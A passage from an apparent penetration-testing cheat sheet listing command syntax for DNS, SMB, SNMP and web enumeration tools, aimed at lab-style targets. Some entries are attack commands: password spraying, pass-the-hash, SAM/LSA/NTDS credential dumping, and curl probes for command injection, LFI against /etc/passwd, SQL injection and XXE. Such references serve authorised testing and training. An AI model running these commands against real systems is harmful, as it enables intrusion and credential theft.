# Wide scan (more IPs)
fierce --domain target.com --wide

# Delay between requests
fierce --domain target.com --delay 1

# Range of IPs to scan
fierce --domain target.com --range 10.10.11.0/24
```

---

## TOOL:sublist3r CAT:enum PROTO:dns
```bash
# Basic subdomain enumeration
sublist3r -d target.com

# With brute force
sublist3r -d target.com -b

# Specific search engines
sublist3r -d target.com -e google,bing,yahoo

# Threads
sublist3r -d target.com -t 10

# Output to file
sublist3r -d target.com -o subdomains.txt

# Enable verbose
sublist3r -d target.com -v

# Ports to scan
sublist3r -d target.com -p 80,443
```

---

## TOOL:amass CAT:enum PROTO:dns
```bash
# Basic enumeration
amass enum -d target.com

# Passive only
amass enum -passive -d target.com

# Active enumeration
amass enum -active -d target.com

# With brute force
amass enum -brute -d target.com

# Output
amass enum -d target.com -o amass.txt

# All techniques
amass enum -d target.com -passive -active -brute
```

---

# 📂 SMB Enumeration

## TOOL:smbclient CAT:enum PROTO:smb PORT:445 PORT:139

**OS:windows OS:linux**
```bash
# List shares (null session)
smbclient -L //10.10.11.5 -N
smbclient -L \\\\10.10.11.5 -N

# List shares with credentials
smbclient -L //10.10.11.5 -U username

# Connect to share (null session)
smbclient //10.10.11.5/share -N
smbclient \\\\10.10.11.5\\share -N

# Connect with credentials
smbclient //10.10.11.5/share -U username
smbclient //10.10.11.5/share -U domain/username

# With password
smbclient //10.10.11.5/share -U username%password

# Commands in SMB shell
smb: \> ls
smb: \> cd directory
smb: \> get file.txt
smb: \> put file.txt
smb: \> mget *.txt
smb: \> mput *.txt
smb: \> pwd
smb: \> help

# Download file
smbclient //10.10.11.5/share -U username -c 'get file.txt'

# Upload file
smbclient //10.10.11.5/share -U username -c 'put file.txt'

# List files in share
smbclient //10.10.11.5/share -U username -c 'ls'

# Recursive download
smbclient //10.10.11.5/share -U username -c 'prompt OFF;recurse ON;mget *'

# Execute command
smbclient //10.10.11.5/share -U username -c 'ls; cd folder; get file.txt'
```

---

## TOOL:smbmap CAT:enum PROTO:smb PORT:445

**OS:windows**
```bash
# List shares (null session)
smbmap -H 10.10.11.5

# With credentials
smbmap -H 10.10.11.5 -u username -p password

# Guest session
smbmap -H 10.10.11.5 -u guest

# Recursive listing
smbmap -H 10.10.11.5 -u username -p password -r
smbmap -H 10.10.11.5 -u username -p password -R

# Specific share
smbmap -H 10.10.11.5 -u username -p password -r 'C$'

# Download file
smbmap -H 10.10.11.5 -u username -p password --download 'share\file.txt'

# Upload file
smbmap -H 10.10.11.5 -u username -p password --upload '/local/file.txt' 'share\file.txt'

# Execute command OS:windows
smbmap -H 10.10.11.5 -u username -p password -x 'whoami'
smbmap -H 10.10.11.5 -u username -p password -x 'ipconfig'

# Domain
smbmap -H 10.10.11.5 -u username -p password -d domain

# List drives
smbmap -H 10.10.11.5 -u username -p password -L

# Pattern matching
smbmap -H 10.10.11.5 -u username -p password -A '*.txt'
smbmap -H 10.10.11.5 -u username -p password -A 'password'

# Depth of recursion
smbmap -H 10.10.11.5 -u username -p password -r --depth 5
```

---

## TOOL:enum4linux CAT:enum PROTO:smb PORT:445 PORT:139

**OS:windows**
```bash
# All enumeration
enum4linux -a 10.10.11.5

# User enumeration
enum4linux -U 10.10.11.5

# Share enumeration
enum4linux -S 10.10.11.5

# Password policy
enum4linux -P 10.10.11.5

# Group enumeration
enum4linux -G 10.10.11.5

# OS information
enum4linux -o 10.10.11.5

# Printer information
enum4linux -i 10.10.11.5

# With credentials
enum4linux -u username -p password -a 10.10.11.5

# Verbose
enum4linux -v 10.10.11.5

# RID cycling
enum4linux -r 10.10.11.5

# Known usernames check
enum4linux -K 10.10.11.5
```

---

## TOOL:enum4linux-ng CAT:enum PROTO:smb PORT:445

**Modern enum4linux**
```bash
# All enumeration
enum4linux-ng -A 10.10.11.5

# With credentials
enum4linux-ng -u username -p password -A 10.10.11.5

# JSON output
enum4linux-ng -A 10.10.11.5 -oJ enum4linux.json

# YAML output
enum4linux-ng -A 10.10.11.5 -oY enum4linux.yaml
```

---

## TOOL:rpcclient CAT:enum PROTO:smb PORT:445 PORT:135

**OS:windows**
```bash
# Connect without password (null session)
rpcclient -U "" -N 10.10.11.5

# With credentials
rpcclient -U username 10.10.11.5

# Commands in rpcclient shell
rpcclient $> enumdomusers          # Enumerate users
rpcclient $> enumdomgroups         # Enumerate groups
rpcclient $> querydominfo          # Domain info
rpcclient $> getdompwinfo          # Password policy
rpcclient $> netshareenum          # Share enumeration
rpcclient $> netshareenumall       # All shares
rpcclient $> netfileenum           # Enumerate files
rpcclient $> srvinfo               # Server info
rpcclient $> queryuser 0x1f4       # User info (RID)
rpcclient $> queryuser username    # User info
rpcclient $> querygroup 0x200      # Group info
rpcclient $> querygroupmem 0x200   # Group members
rpcclient $> lsaenumsid            # Enumerate SIDs
rpcclient $> lookupsids S-1-5-21-... # Lookup SID
rpcclient $> lookupnames username  # Get user SID

# One-liner commands
rpcclient -U "" -N 10.10.11.5 -c enumdomusers
rpcclient -U "" -N 10.10.11.5 -c enumdomgroups
rpcclient -U "" -N 10.10.11.5 -c querydominfo
rpcclient -U "" -N 10.10.11.5 -c netshareenum
rpcclient -U "" -N 10.10.11.5 -c "queryuser 0x1f4"
```

---

## TOOL:crackmapexec TOOL:cme CAT:enum PROTO:smb PORT:445

**OS:windows**
```bash
# SMB enumeration
crackmapexec smb 10.10.11.5

# Null session
crackmapexec smb 10.10.11.5 -u '' -p ''

# Guest session
crackmapexec smb 10.10.11.5 -u 'guest' -p ''

# With credentials
crackmapexec smb 10.10.11.5 -u username -p password

# Password spray CAT:password
crackmapexec smb 10.10.11.0/24 -u users.txt -p 'Password123'
crackmapexec smb 10.10.11.0/24 -u admin -p passwords.txt

# Brute force CAT:password
crackmapexec smb 10.10.11.5 -u admin -p passwords.txt
crackmapexec smb 10.10.11.5 -u users.txt -p passwords.txt

# Continue on success
crackmapexec smb 10.10.11.5 -u users.txt -p passwords.txt --continue-on-success

# Pass the hash CAT:exploit
crackmapexec smb 10.10.11.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Execute command
crackmapexec smb 10.10.11.5 -u administrator -p password -x "whoami"
crackmapexec smb 10.10.11.5 -u administrator -p password -x "ipconfig"

# PowerShell command
crackmapexec smb 10.10.11.5 -u administrator -p password -X '$PSVersionTable'
crackmapexec smb 10.10.11.5 -u administrator -p password -X 'Get-Process'

# Enumerate shares
crackmapexec smb 10.10.11.5 -u administrator -p password --shares

# Enumerate users
crackmapexec smb 10.10.11.5 -u administrator -p password --users

# Enumerate groups
crackmapexec smb 10.10.11.5 -u administrator -p password --groups

# Logged on users
crackmapexec smb 10.10.11.5 -u administrator -p password --loggedon-users

# Sessions
crackmapexec smb 10.10.11.5 -u administrator -p password --sessions

# Disks
crackmapexec smb 10.10.11.5 -u administrator -p password --disks

# Password policy
crackmapexec smb 10.10.11.5 -u administrator -p password --pass-pol

# Dump SAM CAT:exploit
crackmapexec smb 10.10.11.5 -u administrator -p password --sam

# Dump LSA CAT:exploit
crackmapexec smb 10.10.11.5 -u administrator -p password --lsa

# NTDS.dit CAT:exploit
crackmapexec smb 10.10.11.5 -u administrator -p password --ntds

# Spider shares
crackmapexec smb 10.10.11.5 -u administrator -p password -M spider_plus

# Check signing
crackmapexec smb 10.10.11.0/24 --gen-relay-list relay.txt
```

---

## TOOL:netexec CAT:enum PROTO:smb PORT:445

**Modern CrackMapExec fork**
```bash
# Same syntax as crackmapexec
netexec smb 10.10.11.5
netexec smb 10.10.11.5 -u username -p password
netexec smb 10.10.11.5 -u administrator -H HASH
```

---

# 📡 SNMP Enumeration

## TOOL:snmpwalk CAT:enum PROTO:snmp PORT:161

**OS:windows OS:linux**
```bash
# Basic walk (SNMPv1/v2c)
snmpwalk -v2c -c public 10.10.11.5
snmpwalk -v1 -c public 10.10.11.5

# Specific OID
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.1
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.25

# System info
snmpwalk -v2c -c public 10.10.11.5 system
snmpwalk -v2c -c public 10.10.11.5 sysDescr

# Running processes
snmpwalk -v2c -c public 10.10.11.5 hrSWRunName
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public 10.10.11.5 hrSWInstalledName
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.25.6.3.1.2

# Network interfaces
snmpwalk -v2c -c public 10.10.11.5 ipAdEntAddr
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.4.20.1.1

# TCP connections
snmpwalk -v2c -c public 10.10.11.5 tcp
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.6.13.1.3

# UDP connections
snmpwalk -v2c -c public 10.10.11.5 udp

# User accounts OS:windows
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.4.1.77.1.2.25

# Storage information
snmpwalk -v2c -c public 10.10.11.5 hrStorageDescr
snmpwalk -v2c -c public 10.10.11.5 hrStorageUsed

# SNMPv3 (with auth)
snmpwalk -v3 -l authPriv -u username -a SHA -A authpass -x AES -X privpass 10.10.11.5
snmpwalk -v3 -l authNoPriv -u username -a MD5 -A authpass 10.10.11.5
snmpwalk -v3 -l noAuthNoPriv -u username 10.10.11.5

# Different community strings
snmpwalk -v2c -c private 10.10.11.5
snmpwalk -v2c -c manager 10.10.11.5
```

---

## TOOL:snmp-check CAT:enum PROTO:snmp PORT:161
```bash
# Basic check
snmp-check 10.10.11.5

# With community string
snmp-check -c public 10.10.11.5
snmp-check -c private 10.10.11.5

# Port specification
snmp-check -p 161 10.10.11.5

# Output to file
snmp-check -c public 10.10.11.5 > snmp-check.txt
snmp-check -c public 10.10.11.5 | tee snmp-check.txt

# Write to file
snmp-check -c public 10.10.11.5 -w
```

---

## TOOL:onesixtyone CAT:enum PROTO:snmp PORT:161

**Community string brute force**
```bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.5
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.5

# Multiple targets
onesixtyone -c communities.txt -i targets.txt

# Output
onesixtyone -c communities.txt 10.10.11.5 -o output.txt

# Specific community
onesixtyone -c public 10.10.11.5

# Default dictionary
onesixtyone 10.10.11.5
```

---

## TOOL:snmpget CAT:enum PROTO:snmp PORT:161
```bash
# Get specific OID
snmpget -v2c -c public 10.10.11.5 1.3.6.1.2.1.1.1.0

# System name
snmpget -v2c -c public 10.10.11.5 sysName.0

# System description
snmpget -v2c -c public 10.10.11.5 sysDescr.0
```

---

## TOOL:braa CAT:enum PROTO:snmp PORT:161

**Mass SNMP scanner**
```bash
# Query multiple hosts
braa public@10.10.11.1-255:.1.3.6.*

# Specific OID
braa public@10.10.11.5:.1.3.6.1.2.1.1.1.0
```

---

# 🌐 Web Enumeration

## TOOL:gobuster CAT:enum PROTO:http PORT:80 PORT:443 PORT:8080

**Directory & DNS enumeration**
```bash
# Basic directory scan
gobuster dir -u http://10.10.11.5 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.10.11.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With extensions
gobuster dir -u http://10.10.11.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://10.10.11.5 -w wordlist.txt -x php,asp,aspx,jsp,js,txt,pdf,zip

# Extended wordlist
gobuster dir -u http://10.10.11.5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
gobuster dir -u http://10.10.11.5 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Follow redirects
gobuster dir -u http://10.10.11.5 -w wordlist.txt -r

# Expanded mode (show full URLs)
gobuster dir -u http://10.10.11.5 -w wordlist.txt -e

# Custom user agent
gobuster dir -u http://10.10.11.5 -w wordlist.txt -a "Mozilla/5.0"

# Exclude status codes
gobuster dir -u http://10.10.11.5 -w wordlist.txt -b 404,403
gobuster dir -u http://10.10.11.5 -w wordlist.txt -b '404,403,500'

# Include status codes
gobuster dir -u http://10.10.11.5 -w wordlist.txt -s '200,204,301,302,307'

# Custom cookies
gobuster dir -u http://10.10.11.5 -w wordlist.txt -c "PHPSESSID=abcd1234"

# Custom headers
gobuster dir -u http://10.10.11.5 -w wordlist.txt -H "Authorization: Bearer token"

# Verbose output
gobuster dir -u http://10.10.11.5 -w wordlist.txt -v

# Quiet mode
gobuster dir -u http://10.10.11.5 -w wordlist.txt -q

# Threads (default 10)
gobuster dir -u http://10.10.11.5 -w wordlist.txt -t 50

# Timeout
gobuster dir -u http://10.10.11.5 -w wordlist.txt --timeout 10s

# Output to file
gobuster dir -u http://10.10.11.5 -w wordlist.txt -o gobuster.txt

# No error output
gobuster dir -u http://10.10.11.5 -w wordlist.txt -e 2>/dev/null

# DNS subdomain scan PROTO:dns
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

# VHost enumeration
gobuster vhost -u http://10.10.11.5 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://target.com -w wordlist.txt --append-domain

# S3 bucket enumeration
gobuster s3 -w wordlist.txt

# Pattern (instead of wordlist)
gobuster dir -u http://10.10.11.5 -p pattern.txt
```

---

## TOOL:ffuf CAT:enum PROTO:http PORT:80 PORT:443

**Fast web fuzzer**
```bash
# Basic directory fuzzing
ffuf -u http://10.10.11.5/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.11.5/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With extensions
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://10.10.11.5/FUZZ.php -w wordlist.txt

# Subdomain enumeration PROTO:dns
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://FUZZ.target.com -w wordlist.txt -H "Host: FUZZ.target.com"

# VHost fuzzing
ffuf -u http://10.10.11.5 -H "Host: FUZZ.target.com" -w wordlist.txt

# Parameter fuzzing
ffuf -u http://10.10.11.5/page?FUZZ=value -w wordlist.txt
ffuf -u http://10.10.11.5/page?param=FUZZ -w wordlist.txt

# POST parameter fuzzing
ffuf -u http://10.10.11.5/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt
ffuf -u http://10.10.11.5/api -X POST -H "Content-Type: application/json" -d '{"user":"FUZZ"}' -w wordlist.txt

# Multiple FUZZ positions
ffuf -u http://10.10.11.5/FUZZ.FUZ2Z -w wordlist.txt:FUZZ -w extensions.txt:FUZ2Z

# Filter by status code
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -mc all

# Filter out status codes
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fc 404,403

# Filter by response size
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fs 1234
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fs 0

# Filter by word count
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fw 100

# Filter by line count
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fl 50

# Filter by regex
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -fr "error"

# Match regex
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -mr "admin"

# Threads (default 40)
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -t 100

# Rate limiting (requests per second)
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -rate 100

# Delay between requests
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -p 0.1

# Follow redirects
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -r

# Recursion
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -recursion

# Recursion depth
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Silent mode
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -s

# Verbose
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -v

# Output to file
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -o ffuf.json -of json
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -o ffuf.html -of html
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -o ffuf.md -of md

# Auto-calibration (filter out false positives)
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -ac

# Timeout
ffuf -u http://10.10.11.5/FUZZ -w wordlist.txt -timeout 10
```

---

## TOOL:feroxbuster CAT:enum PROTO:http PORT:80 PORT:443

**Recursive web scanner**
```bash
# Basic scan
feroxbuster -u http://10.10.11.5

# With extensions
feroxbuster -u http://10.10.11.5 -x php,html,txt
feroxbuster -u http://10.10.11.5 -x php,asp,aspx,jsp

# Custom wordlist
feroxbuster -u http://10.10.11.5 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://10.10.11.5 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Recursive depth
feroxbuster -u http://10.10.11.5 --depth 4

# Threads
feroxbuster -u http://10.10.11.5 -t 50
feroxbuster -u http://10.10.11.5 -t 200

# Filter status codes
feroxbuster -u http://10.10.11.5 -C 404,403
feroxbuster -u http://10.10.11.5 --filter-status 404,403

# Filter by size
feroxbuster -u http://10.10.11.5 -S 1234

# Filter by word count
feroxbuster -u http://10.10.11.5 -W 100

# Filter by line count
feroxbuster -u http://10.10.11.5 -N 50

# Extract links from responses
feroxbuster -u http://10.10.11.5 --extract-links

# Follow redirects
feroxbuster -u http://10.10.11.5 -r

# Insecure (ignore SSL errors)
feroxbuster -u https://10.10.11.5 -k

# Rate limit (per second)
feroxbuster -u http://10.10.11.5 --rate-limit 100

# Timeout
feroxbuster -u http://10.10.11.5 --timeout 10

# User agent
feroxbuster -u http://10.10.11.5 -a "Mozilla/5.0"

# Headers
feroxbuster -u http://10.10.11.5 -H "Authorization: Bearer token"

# Cookies
feroxbuster -u http://10.10.11.5 -b "PHPSESSID=abc123"

# Output
feroxbuster -u http://10.10.11.5 -o ferox.txt

# Silent
feroxbuster -u http://10.10.11.5 --silent

# Quiet
feroxbuster -u http://10.10.11.5 -q

# No recursion
feroxbuster -u http://10.10.11.5 --no-recursion

# Scan limit (max requests)
feroxbuster -u http://10.10.11.5 --scan-limit 1000
```

---

## TOOL:dirb CAT:enum PROTO:http PORT:80 PORT:443

**Web content scanner**
```bash
# Basic scan
dirb http://10.10.11.5

# Custom wordlist
dirb http://10.10.11.5 /usr/share/wordlists/dirb/common.txt
dirb http://10.10.11.5 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# With extensions
dirb http://10.10.11.5 -X .php,.html,.txt

# Ignore responses
dirb http://10.10.11.5 -N 404

# Save output
dirb http://10.10.11.5 -o dirb.txt

# Fine tuning
dirb http://10.10.11.5 -f  # Fine search
dirb http://10.10.11.5 -r  # Non-recursive
dirb http://10.10.11.5 -z 10  # Delay (ms)

# Authentication
dirb http://10.10.11.5 -u username:password

# Cookies
dirb http://10.10.11.5 -c "PHPSESSID=abc123"

# User agent
dirb http://10.10.11.5 -a "Mozilla/5.0"

# Proxy
dirb http://10.10.11.5 -p http://127.0.0.1:8080
```

---

## TOOL:dirsearch CAT:enum PROTO:http PORT:80 PORT:443

**Web path scanner**
```bash
# Basic scan
dirsearch -u http://10.10.11.5

# With extensions
dirsearch -u http://10.10.11.5 -e php,html,txt
dirsearch -u http://10.10.11.5 -e *

# Custom wordlist
dirsearch -u http://10.10.11.5 -w /usr/share/wordlists/dirb/common.txt

# Threads
dirsearch -u http://10.10.11.5 -t 50

# Recursive
dirsearch -u http://10.10.11.5 -r
dirsearch -u http://10.10.11.5 -r -R 3  # Depth 3

# Exclude status
dirsearch -u http://10.10.11.5 -x 403,404

# Timeout
dirsearch -u http://10.10.11.5 --timeout 10

# Delay
dirsearch -u http://10.10.11.5 --delay 1

# Follow redirects
dirsearch -u http://10.10.11.5 --follow-redirects

# Output
dirsearch -u http://10.10.11.5 -o dirsearch.txt
dirsearch -u http://10.10.11.5 --format json -o dirsearch.json

# Quiet mode
dirsearch -u http://10.10.11.5 -q

# Scan multiple URLs
dirsearch -l urls.txt
```

---

## TOOL:nikto CAT:enum PROTO:http PORT:80 PORT:443

**Web server scanner**
```bash
# Basic scan
nikto -h http://10.10.11.5

# Specific port
nikto -h http://10.10.11.5:8080

# SSL/TLS
nikto -h https://10.10.11.5
nikto -h https://10.10.11.5 -ssl

# Save output
nikto -h http://10.10.11.5 -o nikto.txt
nikto -h http://10.10.11.5 -o nikto.html -Format html
nikto -h http://10.10.11.5 -o nikto.xml -Format xml
nikto -h http://10.10.11.5 -o nikto.csv -Format csv

# Tune options (specific tests)
nikto -h http://10.10.11.5 -Tuning x  # Reverse proxy
nikto -h http://10.10.11.5 -Tuning 1  # Interesting files
nikto -h http://10.10.11.5 -Tuning 2  # Misconfiguration
nikto -h http://10.10.11.5 -Tuning 3  # Information disclosure
nikto -h http://10.10.11.5 -Tuning 4  # Injection
nikto -h http://10.10.11.5 -Tuning 9  # SQL injection

# Multiple tuning
nikto -h http://10.10.11.5 -Tuning 123

# No 404 checks
nikto -h http://10.10.11.5 -no404

# Use proxy
nikto -h http://10.10.11.5 -useproxy http://127.0.0.1:8080

# Vhost
nikto -h http://10.10.11.5 -vhost target.com

# Update database
nikto -update

# List plugins
nikto -list-plugins
```

---

## TOOL:whatweb CAT:enum PROTO:http PORT:80 PORT:443

**Web technology identifier**
```bash
# Basic scan
whatweb http://10.10.11.5

# Verbose levels
whatweb http://10.10.11.5 -v
whatweb http://10.10.11.5 -v -v  # Very verbose

# Aggressive mode (level 3)
whatweb -a 3 http://10.10.11.5

# Aggression levels
whatweb -a 1 http://10.10.11.5  # Stealthy
whatweb -a 2 http://10.10.11.5  # Unused
whatweb -a 3 http://10.10.11.5  # Aggressive
whatweb -a 4 http://10.10.11.5  # Heavy

# Custom user agent
whatweb --user-agent "Mozilla/5.0" http://10.10.11.5

# Scan from file
whatweb -i targets.txt

# Follow redirects
whatweb --follow-redirect=never http://10.10.11.5
whatweb --follow-redirect=http-only http://10.10.11.5
whatweb --follow-redirect=all http://10.10.11.5

# Output formats
whatweb --log-brief=whatweb.txt http://10.10.11.5
whatweb --log-verbose=whatweb.txt http://10.10.11.5
whatweb --log-xml=whatweb.xml http://10.10.11.5
whatweb --log-json=whatweb.json http://10.10.11.5
whatweb --log-sql=whatweb.sql http://10.10.11.5

# No errors
whatweb --no-errors http://10.10.11.5

# Proxy
whatweb --proxy http://127.0.0.1:8080 http://10.10.11.5

# Cookie
whatweb --cookie "PHPSESSID=abc123" http://10.10.11.5
```

---

## TOOL:wpscan CAT:enum PROTO:http PORT:80 PORT:443

**WordPress scanner**
```bash
# Basic scan
wpscan --url http://target.com

# Update database
wpscan --update

# Enumerate users
wpscan --url http://target.com --enumerate u
wpscan --url http://target.com --enumerate u1-100

# Enumerate vulnerable plugins
wpscan --url http://target.com --enumerate vp

# Enumerate all plugins
wpscan --url http://target.com --enumerate ap
wpscan --url http://target.com --enumerate p

# Enumerate vulnerable themes
wpscan --url http://target.com --enumerate vt

# Enumerate all themes
wpscan --url http://target.com --enumerate at
wpscan --url http://target.com --enumerate t

# Enumerate media
wpscan --url http://target.com --enumerate m

# Enumerate config backups
wpscan --url http://target.com --enumerate cb

# Enumerate DB exports
wpscan --url http://target.com --enumerate dbe

# Full enumeration
wpscan --url http://target.com --enumerate u,vp,ap,vt,at,cb,dbe
wpscan --url http://target.com --enumerate

# Password brute force CAT:password
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt
wpscan --url http://target.com -U users.txt -P passwords.txt

# Threads
wpscan --url http://target.com --max-threads 50

# API token (for vulnerability data)
wpscan --url http://target.com --api-token YOUR_TOKEN

# Random user agent
wpscan --url http://target.com --random-user-agent

# Disable SSL verification
wpscan --url https://target.com --disable-tls-checks

# Follow redirects
wpscan --url http://target.com --follow-redirection

# Proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Output
wpscan --url http://target.com -o wpscan.txt
wpscan --url http://target.com -f json -o wpscan.json
wpscan --url http://target.com -f cli-no-color -o wpscan.txt
```

---

## TOOL:nuclei CAT:enum CAT:vuln PROTO:http PORT:80 PORT:443

**Vulnerability scanner with templates**
```bash
# Basic scan
nuclei -u http://10.10.11.5

# Scan with all templates
nuclei -u http://10.10.11.5 -t ~/nuclei-templates/

# Severity filter
nuclei -u http://10.10.11.5 -severity critical
nuclei -u http://10.10.11.5 -severity critical,high
nuclei -u http://10.10.11.5 -severity critical,high,medium

# Tags
nuclei -u http://10.10.11.5 -tags cve
nuclei -u http://10.10.11.5 -tags cve,oast
nuclei -u http://10.10.11.5 -tags lfi,rce,sqli

# Specific template
nuclei -u http://10.10.11.5 -t ~/nuclei-templates/cves/
nuclei -u http://10.10.11.5 -t ~/nuclei-templates/vulnerabilities/

# Exclude templates
nuclei -u http://10.10.11.5 -etags dos

# Rate limit
nuclei -u http://10.10.11.5 -rate-limit 150
nuclei -u http://10.10.11.5 -rl 100

# Bulk targets
nuclei -l targets.txt

# Silent mode
nuclei -u http://10.10.11.5 -silent

# Verbose
nuclei -u http://10.10.11.5 -v
nuclei -u http://10.10.11.5 -vv

# Update templates
nuclei -update-templates

# JSON output
nuclei -u http://10.10.11.5 -json -o nuclei.json

# Markdown output
nuclei -u http://10.10.11.5 -markdown-export nuclei.md

# Report generation
nuclei -u http://10.10.11.5 -report-config report-config.yaml

# Proxy
nuclei -u http://10.10.11.5 -proxy http://127.0.0.1:8080

# Timeout
nuclei -u http://10.10.11.5 -timeout 10

# Retries
nuclei -u http://10.10.11.5 -retries 3
```

---

## TOOL:curl CAT:enum PROTO:http PORT:80 PORT:443

**Command line HTTP client**
```bash
# Basic GET request
curl http://10.10.11.5
curl http://10.10.11.5/page

# Follow redirects
curl -L http://10.10.11.5

# Show response headers only
curl -I http://10.10.11.5
curl --head http://10.10.11.5

# Verbose (show request + response)
curl -v http://10.10.11.5

# Silent mode
curl -s http://10.10.11.5

# Output to file
curl http://10.10.11.5 -o output.html
curl http://10.10.11.5 -O  # Use remote filename

# POST request
curl -X POST http://10.10.11.5/login
curl -X POST -d "username=admin&password=pass" http://10.10.11.5/login

# POST JSON
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"password"}' http://10.10.11.5/api

# PUT request
curl -X PUT -d "data" http://10.10.11.5/resource

# DELETE request
curl -X DELETE http://10.10.11.5/resource/1

# Cookies
curl -b "PHPSESSID=abcd1234" http://10.10.11.5
curl -c cookies.txt http://10.10.11.5  # Save cookies
curl -b cookies.txt http://10.10.11.5  # Load cookies

# Custom headers
curl -H "Authorization: Bearer token" http://10.10.11.5
curl -H "X-Custom-Header: value" http://10.10.11.5
curl -H "User-Agent: Custom" http://10.10.11.5

# Basic authentication
curl -u username:password http://10.10.11.5
curl --user username:password http://10.10.11.5

# Bearer token
curl -H "Authorization: Bearer TOKEN" http://10.10.11.5

# Upload file
curl -F "file=@/path/to/file.txt" http://10.10.11.5/upload
curl --form "file=@/path/to/file.txt" http://10.10.11.5/upload

# Multiple files
curl -F "file1=@file1.txt" -F "file2=@file2.txt" http://10.10.11.5/upload

# Proxy
curl -x http://127.0.0.1:8080 http://10.10.11.5
curl --proxy http://127.0.0.1:8080 http://10.10.11.5

# Ignore SSL errors
curl -k https://10.10.11.5
curl --insecure https://10.10.11.5

# Limit transfer rate
curl --limit-rate 1M http://10.10.11.5/large-file

# Timeout
curl --connect-timeout 10 http://10.10.11.5
curl --max-time 30 http://10.10.11.5

# Range (partial content)
curl -r 0-1023 http://10.10.11.5/large-file

# Show timing
curl -w "@curl-format.txt" http://10.10.11.5

# Test for command injection CAT:exploit
curl "http://10.10.11.5/page?cmd=;id"
curl "http://10.10.11.5/page?cmd=|id"
curl "http://10.10.11.5/page?cmd=%26%26id"
curl "http://10.10.11.5/page?cmd=\`id\`"
curl "http://10.10.11.5/page?cmd=$(id)"

# LFI testing CAT:exploit
curl "http://10.10.11.5/page?file=../../../etc/passwd"
curl "http://10.10.11.5/page?file=....//....//....//etc/passwd"
curl "http://10.10.11.5/page?file=/etc/passwd%00"

# SQL injection testing CAT:exploit
curl "http://10.10.11.5/page?id=1'"
curl "http://10.10.11.5/page?id=1%20OR%201=1"
curl "http://10.10.11.5/page?id=1%20UNION%20SELECT%20NULL"

# XXE testing CAT:exploit
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' http://10.10.11.5/api
```

---

## TOOL:wget CAT:enum CAT:transfer PROTO:http
```bash
# Download file
wget http://10.10.11.5/file.txt

# Save with different name
wget http://10.10.11.5/file.txt -O newname.txt

# Download recursively
wget -r http://10.10.11.5

# Mirror website
wget -m http://10.10.11.5

# Continue partial download
wget -c http://10.10.11.5/large-file

# Limit rate
wget --limit-rate=1m http://10.10.11.5/file

# Background download
wget -b http://10.10.11.5/file

# Reject file types
wget -r --reject=jpg,gif,png http://10.10.11.5

# Accept file types
wget -r --accept=pdf,doc http://10.10.11.5

# Proxy
wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 http://10.10.11.5

# No SSL check
wget --no-check-certificate https://10.10.11.5
```

---

## TOOL:httpx CAT:enum PROTO:http

**HTTP toolkit**
```bash
# Probe URLs
httpx -l urls.txt

# Specific ports
httpx -l urls.txt -ports 80,443,8080,8443

# Title extraction
